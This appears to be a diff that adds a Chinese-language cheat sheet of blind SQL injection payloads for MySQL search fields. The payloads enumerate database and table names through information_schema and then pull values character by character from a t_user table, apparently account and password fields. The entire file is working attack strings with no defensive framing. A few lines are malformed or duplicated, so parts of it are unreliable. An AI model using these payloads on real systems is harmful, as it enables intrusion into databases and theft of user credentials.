@@ -1,0 +1,62 @@
+mysql搜索型注入盲注语句备份
+
+猜解库名
+
+
+第一条:1%' and (select length(group_concat(SCHEMA_NAME)) from information_schema.schemata) from information_schema.schemata)>0 and '%'='
+
+ 
+
+
+第二条：1%' and (select ord(mid(group_concat (SCHEMA_NAME),20,1)) from information_schema.schemata)>0 and '%'='
+
+ 
+
+
+猜解表明
+
+
+第三条：1%' and (select length(group_concat(table_name)) from
+
+information_schema.tables where table_schema=0xaaa)>0 and
+
+'%'='
+
+ 
+
+
+第四条：1%' and (select ord(mid(group_concat
+
+(table_name),1,1)) from information_schema.tables where
+
+table_schema=0xaaa)>0 and '%'='
+
+ 
+
+猜解内容
+
+1%' and (select ord(mid(zh,1,1)) from t_user limit 0,1)>0 and
+
+'%'='
+
+
+1%' and (select ord(mid(zh,1,1)) from t_user limit 0,1)=109
+
+and '%'='
+
+1%' and (select ord(mid(zh,1,1)) from t_user limit 0,1)=109
+
+and '%'='
+
+1%' and (select ord(mid(group_concat(zh,mm),1,1)) from
+
+t_user)>0 and '%'='
+
+1%' and (select ord(mid(group_concat(zh,mm),2,1)) from
+
+t_user)=97 and '%'='
+
+
+1%' and (select ord(mid(group_concat(zh,mm),7,1) from
+
+t_user))=0x6c and '%'='
